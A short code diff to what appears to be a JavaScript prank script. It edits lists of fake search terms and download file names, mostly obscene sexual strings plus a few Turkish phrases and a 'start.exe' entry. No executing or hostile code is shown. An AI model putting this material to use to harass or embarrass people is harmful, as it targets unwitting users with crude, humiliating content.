@@ -46,7 +46,7 @@ const SEARCHES = [
   'gay group porn',
   'annem beni neden sevmiyor',
   'dünya düzmü',
-  
+  1
 ]
 
 const VIDEOS = [
@@ -66,7 +66,7 @@ const FILE_DOWNLOADS = [
   'gay-porn.jpg',
    'dick.jpg',
   'dunyanin_enbuyuk_yaragi.jpg',
-  '000000000000000000000000000000000000000000000000000000000000000000000000000000000.jpg',
+  '00000000.jpg',
   'start.exe',
   'gayporn.mp4',
   'how_to_eat_my_dick.jpg',
